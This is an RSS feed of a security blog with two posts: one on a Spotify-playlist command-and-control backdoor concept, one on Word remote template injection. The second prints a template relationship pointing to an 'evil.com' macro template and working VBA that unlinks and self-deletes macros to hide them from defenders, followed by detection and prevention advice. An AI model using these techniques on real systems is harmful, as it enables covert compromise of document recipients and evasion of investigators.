<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>John Woodman's Security Blog</title>
    <description>I'm a security enthusiast looking for new ways to break stuff and stay hidden while doing it. All content posted here is for educational and research purposes only. </description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>John Woodman</name>
      <email>john.woodman11@gmail.com</email>
      <uri>https://google.com/</uri>
    </author>
    
      <item>
        <title>The Most Fun (and maybe impractical) Command and Control: SpotifyC2</title>
        <description>&lt;p&gt;Command and Control is one of the most common techniques used by attackers to maintain persistent control over an infected computer, sending commands to be executed and receiving the output of those commands. There exists many different methods for implementing Command and Control, from using cloud services (AWS, Azure, etc.) to even using social media to send commands. One method we will be exploring is one I haven’t seen before (probably for a good reason): using Spotify to send commands and receive output.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;

&lt;p&gt;This project was inspired by a talk my good friend Terry Thibault (&lt;a href=&quot;https://twitter.com/defnotprobro&quot;&gt;@defnotprobro&lt;/a&gt;) did at BSides Orlando, where he leveraged Twitter as a method for Command and Control.&lt;/p&gt;

&lt;p&gt;Command and Control essentially functions through a backdoor running on the infected machine, beaconing out every once in a while to retrieve a command or a set of commands to be executed. Commands sent to the beacon are usually encoded or hidden in some way (base64, hidden in an image, etc.) to make it harder for someone to detect. My method uses acrostics in Spotify playlist tracks to send commands, and retrieves output through the description box available in those playlists.&lt;/p&gt;

&lt;p&gt;I developed multiple scripts to form a proof-of-concept:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2&quot;&gt;SpotifyC2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I use Spotify’s API for creating and editing the playlists. If you’d like to use SpotifyC2 yourself, you’ll need to place your own client ID, secret, and refresh token in the scripts.&lt;/p&gt;

&lt;h2 id=&quot;breakdown&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Breakdown&lt;/h2&gt;

&lt;p&gt;Below is a breakdown of the Command and Control process using SpotifyC2.&lt;/p&gt;

&lt;h3 id=&quot;generating--sending-the-acrostic-command&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Generating &amp;amp; Sending The Acrostic Command&lt;/h3&gt;

&lt;p&gt;The command that the attacker wants to send to the infected machine is first checked for special and numeric characters and replaced with ascii characters, since most Spotify songs don’t start with a special character or a number. The replacement method I used was fairly simple: SPACE character was ‘space’, / was ‘fslash’, \ was ‘bslash’ and so on. Once the command is written in all ascii characters, an acrostic is generated based of a list of Spotify songs organized by genre (credit to &lt;a href=&quot;https://github.com/plamere/enspex/tree/master/web/Acrostify&quot;&gt;Acrostify&lt;/a&gt; for the database of songs). Using my PoC, you can select which genre of music to generate the acrostic from, cause why not :).&lt;/p&gt;

&lt;p&gt;The acrostic generated is also randomized, so repeating characters will not have repeating songs. Once the acrostic is generated, a playlist is created with a name of your choice. For my PoC, the name of the playlist does not matter, but it could be used to organize commands, or even correspond to times at which the command should be run on the infected machine (might add that feature later). The playlist will contain all the songs from the acrostic. However, an issue I ran into was certain genres of the song database wouldn’t generate the exact acrostic correctly, occasionally adding or replacing characters that shouldn’t be there. I didn’t test this on all genres (jazz and country were the ones I noticed the issue with), but the rock genre never gave me any issues, so I’d reccommend that until I figure out what the issue is.&lt;/p&gt;

&lt;p&gt;Below shows a playlist created from the command “cat /etc/passwd”. You can see the beginning of the command hidden in the acrostic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/1.png&quot; alt=&quot;&quot; height=&quot;435px&quot; width=&quot;666px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the playlist is created, the playlist ID and command is placed in a file (playlist_id_list.txt) on your local machine, which is to be used later when retrieving the output from the infected machine.&lt;/p&gt;

&lt;p&gt;In my PoC, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/genAcrostic.py&quot;&gt;genAcrostic.py&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-backdoor&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Backdoor&lt;/h3&gt;

&lt;p&gt;This part describes everything that the infected machine is doing to receive and execute the command as well as send back the command output. The backdoor beacons out periodically (the less freqeunt, the more stealhty), making a request to the Spotify API to list all of its current playlists. Each playlist contains a command, hidden in an acrostic built from the songs in the playlist. The backdoor gets the first letter of each song, decodes the special characters and numbers as needed, and formulates a command to be executed.&lt;/p&gt;

&lt;p&gt;Initially, I was going to have the output of the command encoded in an acrostic just as I did when sending the command, but I realized that there were a lot more special characters and keys, which would make the acrostic overly and unnecessarily complex. While looking through the Spotify app to see if there were any other ways, I noticed that each playlist has a description box. I decided that it made much more sense to send the base64 encoded output through there.&lt;/p&gt;

&lt;p&gt;However, the description box has a size limit of 300 characters, too short for the majority of the base64 encoded output. A fix I came up with was to split the base64 encoded output into 300 character pieces, placing the first piece in the description of the original command’s playlist. The subsequent 300 character pieces are then placed into newly created playlists until the entire output is used. In order for the attacker machine to re-assemble the base64 encoded output, the name of each of the newly created playlists are based off the playlist ID of original command’s playlist, with an incrementing number added to the end.&lt;/p&gt;

&lt;p&gt;Below shows a playlist created by the backdoor. A piece of the base64 encoded output is embedded in the description, and the name of the playlist reflects the playlist ID of the original command acrsotic, with an incrementing number added as the suffix (the image shows the 29th playlist created for this output). On the left are the list of the other playlists created, each containing a piece of the output to be re-assembled and decoded:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/2.png&quot; alt=&quot;&quot; height=&quot;354px&quot; width=&quot;671px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my Poc, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/backdoor.py&quot;&gt;backdoor.py&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;retrieving-output&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Retrieving Output&lt;/h3&gt;

&lt;p&gt;Retrieving the output from the command is fairly straight forward. A request is made to the Spotify API to retrieve a list of all the playlists, which now contain the newly created ones from the backdoor. The description is retrieved from each of the playlists, and based off the incrementing number at the end of each playlist ID, the base64 encoded text is re-assembled in the proper order, and is then decoded to output of the command. Since multiple commands can be sent to the backdoor, in order to correspond an output to a specific command, the file “playlist_id_list.txt” is used to relate a playlist ID with its command. Once all the command outputs are retrieved and decoded, the “playlist_id_list.txt” file is deleted, as well as the Spotify playlists themselves.&lt;/p&gt;

&lt;p&gt;As shown below, once this process is complete, the playlists associated with the command and its output is deleted:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/3.png&quot; alt=&quot;&quot; height=&quot;348px&quot; width=&quot;533px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my PoC, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/getOutput.py&quot;&gt;getOutput.py&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This method of Command and Control actually works quite well compared with other forms of social media C2. Commands are hidden in a unique way that may not be easily detected, and considering the vast number of playlists existing in Spotify, finding the C2 playlists would be quite a challenge for anyone looking for them. Some drawbacks to this method is the fact that Spotify never actually deletes a playlist, it technically only unfollows it. This isn’t a huge issue, as finding the playlist after unfollowing it is extremely difficult, but it should be known that it isn’t impossible. I suppose the main drawback is the fact that it probably makes more sense to use the other methods of C2 as they are likely more reliable and more private, such as gmail or Direct Messaging in other social media platforms. However, SpotifyC2 provides its own fun and unique ways of keeping commands hidden.&lt;/p&gt;

&lt;p&gt;I started this project firstly to learn more about Command and Control and the various methods used, and secondly to prove that this method could be done and that Spotify is a viable option for Command and Control, and I think I’ve done just that. While it isn’t the most practical, it certainly holds its own amongst the other unique methods of C2. Not to mention, its a lot of fun to think you can control someone’s computer by sending We Will Rock You.&lt;/p&gt;

</description>
        <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
        <link>//posts/SpotifyC2/</link>
        <link href="/posts/SpotifyC2/"/>
        <guid isPermaLink="true">/posts/SpotifyC2/</guid>
      </item>
    
      <item>
        <title>VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion</title>
        <description>&lt;p&gt;One of the most common methods leveraged by attackers is the use of Malicious Word/Excel Documents sent over email. These malicious docs are embedded with macro VBA code that, when run, execute various tasks on the victim’s computer, usually resulting in RCE (Remote Code Execution) and/or data exfiltration.&lt;/p&gt;

&lt;p&gt;There are numerous techniques used on these malicious docs to bypass anti-virus detection (VBAStomping, obfuscation, etc.). One such method is Remote Template Injection.&lt;/p&gt;

&lt;h2 id=&quot;remote-template-injection&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Remote Template Injection&lt;/h2&gt;

&lt;p&gt;Word/Excel docs are made up of a collection of XML files all zipped together. You can actually unzip these docs by renaming the extension to .zip and extracting the contents as you would any zipped file. The XML file that we’re most interested in is settings.xml.rels located in the folder word_rels. However, if you unzipped just any document and looked for this file, it is likely that it won’t exist.&lt;/p&gt;

&lt;p&gt;This is because settings.xml.rels exists only for documents that were created from a template. This isn’t a huge issue, just make sure when you create the document, that it’s based off a pre-made template (you can choose any of the default templates Microsoft already provides). While the rest of this post should still apply to both Word and Excel documents, I will be referring specifically to Word documents for the remainder of the post, as I have not tested all of this on Excel.&lt;/p&gt;

&lt;p&gt;Below shows the contents of settings.xml.rels that you would typically find with most documents:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;?xml version=”1.0&quot; encoding=”UTF-8&quot; standalone=”yes”?&gt;
  &lt;p&gt;&amp;lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&amp;gt;&amp;lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”file:////Users/johnwoodman/Library/Containers/com.microsoft.Word/Data/Library/Application%20Support/Microsoft/Office/16.0/DTS/en-US%7b95D41D06–9CC6-D74F-A607–2B7C0EB22DFC%7d/%7b33B4F4BC-0742–3849-AA14-CD5092D5B844%7dtf10002086.dotx” TargetMode=”External”/&amp;gt;&amp;lt;/Relationships&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The part to pay attention to is the “Target” attribute. At the moment, this attribute is pointing to a file on the local machine. What we are able to do is change the value so it points to a remote file, which will then be used as the template for that document. This template would contain the macros you want to be executed. You can specify either an HTTP(S) URL or a SMB address pointing to your template.&lt;/p&gt;

&lt;p&gt;Below shows the contents of settings.xml.rels after it has been altered to point to a malicious web server containing a malicious word template:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;?xml version=”1.0&quot; encoding=”UTF-8&quot; standalone=”yes”?&gt;
  &lt;p&gt;&amp;lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&amp;gt;&amp;lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”https://evil.com/malicious.dotm” TargetMode=”External”/&amp;gt;&amp;lt;/Relationships&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Once edited, all you have to do is re-zip the XML files and rename the extension to .docx. All that is left to do is send malicious doc to your “target” and once opened (and content is enabled) the template is pulled from the malicious web server and the macro code inside it is executed.&lt;/p&gt;

&lt;p&gt;I created a &lt;a href=&quot;https://github.com/JohnWoodman/remoteinjector&quot;&gt;tool&lt;/a&gt; that automates all this for you!&lt;/p&gt;

&lt;h2 id=&quot;unlinking--self-deletion&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Unlinking &amp;amp; Self-Deletion&lt;/h2&gt;

&lt;p&gt;While Remote Template Injection can be very useful in evading anti-virus, once the template is run, the VBA code will remain in the document. This means if blue team gets ahold of the document, they can see all the malicious code that was executed.&lt;/p&gt;

&lt;p&gt;The technique I found to get around this is by unlinking the template using VBA. The below snippet of VBA code shows how the unlinking is done, as well as how to prevent dialog boxes from popping up to the target user asking them to “Save Changes”.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sub unlink()
    Application.DisplayAlerts = False
    On Error GoTo Destroy
    ThisDocument.AttachedTemplate.Saved = True
    CurrUser = Application.UserName
    tmpLoc = &quot;C:\Users\&quot; &amp;amp; CurrUser &amp;amp; &quot;\AppData\Roaming\Microsoft\Templates\Normal.dotm&quot;
    ActiveDocument.AttachedTemplate = tmpLoc
    ActiveDocument.AttachedTemplate.Saved = True
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
    ThisDocument.Close savechanges:=False
Exit Sub
Destroy:
    Call ThisDocument.DeleteVBAPROJECT
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
    ActiveDocument.AttachedTemplate.Saved = True
    ThisDocument.Close savechanges:=False
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Essentially, to unlink the current template you have to link the document to another template. In the above code, I am linking it to Normal.dotm, the default template found in every computer with Word installed.&lt;/p&gt;

&lt;p&gt;The code in the “Destroy” section of the code is the self-deletion, essentially a fail-safe. If an error occurs in the unlinking process (either through Normal.dotm not existing, or another error that I will discuss below), then the function “DeleteVBAPROJECT” is called. This function deletes all the code in the template. Below is a snippet of that function’s code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sub DeleteVBAPROJECT()
    Application.DisplayAlerts = False
    Dim i As Long
    On Error Resume Next
    With ThisDocument.VBProject
        For i = .VBComponents.Count To 1 Step -1
            .VBComponents.Remove .VBComponents(i)
            .VBComponents(i).CodeModule.DeleteLines _
            1, .VBComponents(i).CodeModule.CountOfLines
        Next i
    End With
    On Error GoTo 0
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This function serves only as a last-ditch effort if the unlinking method errors out.&lt;/p&gt;

&lt;p&gt;To show that the Macro VBA code can not be viewed (at least not easily), the below image shows the VBA Editor of the malicious document before the macro has been run:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see that the template “DocTemp” has been loaded into the document, but the VBA code itself has not. Even before the macro code is run, it is not view-able.&lt;/p&gt;

&lt;p&gt;The following image shows the VBA Editor after the content has been enabled (note: in this scenario, the VBA Editor has not been opened prior to enabling content, the reason that is important is explained later):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see the macro code from the template has been executed (popping calc.exe) and the template has successfully unlinked itself from the word document, no longer appearing in the VBA Editor.&lt;/p&gt;

&lt;p&gt;As I referenced earlier, one of the errors that continued to happen with the unlink method occurred whenever I would open the malicious document, and then open and close the VBA Editor window. I am still unsure as to why simply opening the VBA Editor causes the unlink method to fail, but the self-deletion method is currently the best temporary solution, as it still gets rid of all lines of code that could be viewed by potential blue team.&lt;/p&gt;

&lt;p&gt;The below image shows what remains if the VBA Editor is opened prior to enabling content:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the reference to DocTemp remains, however, all the VBA code has been deleted.&lt;/p&gt;

&lt;h2 id=&quot;detectionprevention&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Detection/Prevention&lt;/h2&gt;

&lt;p&gt;This method isn’t perfect. While I haven’t found anyway to view the actual Macro VBA code from the target side (both before and after enabling content), there are still ways to view the function names as well as the source URL that the template is being retrieved from. To view the function names:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the malicious document, but do not enable content.&lt;/li&gt;
  &lt;li&gt;Select the “Macros” button in the Developer tab.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will give you the function names, but only the names. You will not be able to edit or step into these functions as they technically have not been loaded yet.&lt;/p&gt;

&lt;p&gt;To view the source URL of the template:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the malicious document, but do not enable content.&lt;/li&gt;
  &lt;li&gt;Select the “Document Template” button in the Developer tab.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will display the URL that the malicious document is grabbing the template from, allowing you to potentially retrieve the template from that URL yourself and be able to fully analyze the macro VBA code.&lt;/p&gt;

&lt;p&gt;In terms of prevention, disabling the ability for Word/Excel documents to retrieve templates remotely would be the most effective against this type of attack.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I made this post mostly to help me learn and better understand the security and inner workings behind Macros, but I hope it also gives insight into one of numerous techniques to evade anti-virus and static analysis, and also how to detect and prevent against it.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html&quot;&gt;Executing Macros From a DOCX With Remote Template Injection by BinaryFaultline&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 28 Nov 2019 00:00:00 +0000</pubDate>
        <link>//posts/VBA-Macro-Remote-Template-Injection/</link>
        <link href="/posts/VBA-Macro-Remote-Template-Injection/"/>
        <guid isPermaLink="true">/posts/VBA-Macro-Remote-Template-Injection/</guid>
      </item>
    
  </channel>
</rss>
